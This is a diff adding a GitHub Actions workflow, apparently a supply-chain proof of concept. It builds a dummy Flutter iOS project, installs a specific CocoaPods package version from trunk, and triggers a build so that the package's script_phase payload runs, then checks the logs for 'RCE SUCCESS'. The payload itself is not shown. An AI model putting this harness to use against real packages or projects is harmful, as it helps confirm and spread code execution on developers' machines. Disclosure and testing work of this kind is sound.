@@ -1,0 +1,38 @@
+name: Sendbird Supply Chain Impact Proof
+on: workflow_dispatch
+
+jobs:
+  verify_rce:
+    runs-on: macos-latest
+    steps:
+      - name: Setup Flutter/iOS Environment
+        uses: subosito/flutter-action@v2
+        with:
+          channel: 'stable'
+
+      - name: Replicate Customer Integration
+        run: |
+          # 1. Inisialisasi project dummy
+          mkdir sendbird_victim && cd sendbird_victim
+          flutter create .
+          
+          cd ios
+          # 2. Tambahkan Trunk CDN (Standard Dev Environment)
+          pod repo add-cdn trunk https://cdn.cocoapods.org/ || true
+          
+          # 3. Inject Target Pod (Manual Podfile Entry)
+          # Kita simulasikan developer yang nambahin Messenger v5.1.0 lu
+          echo "pod 'SendbirdAIAgentMessenger', '5.1.0'" >> Podfile
+          
+          # 4. Trigger Installation
+          # Di sini CocoaPods bakal narik v5.1.0 lu dari Trunk
+          pod install --repo-update --verbose 2>&1 | tee pod_install.log
+          
+          # 5. THE SMOKING GUN: Trigger Build
+          # Payload script_phase lu HARUS jalan di sini sebelum kompilasi
+          echo "=== Launching Build to Trigger RCE ==="
+          flutter build ios --no-codesign 2>&1 | tee build.log || true
+          
+          # 6. Audit Log
+          echo "=== Checking for Payload Execution in Logs ==="
+          grep -i "Messenger UI Audit" build.log && echo "RCE SUCCESS: Payload Executed!" || echo "RCE FAILED: Script phase didn't run"
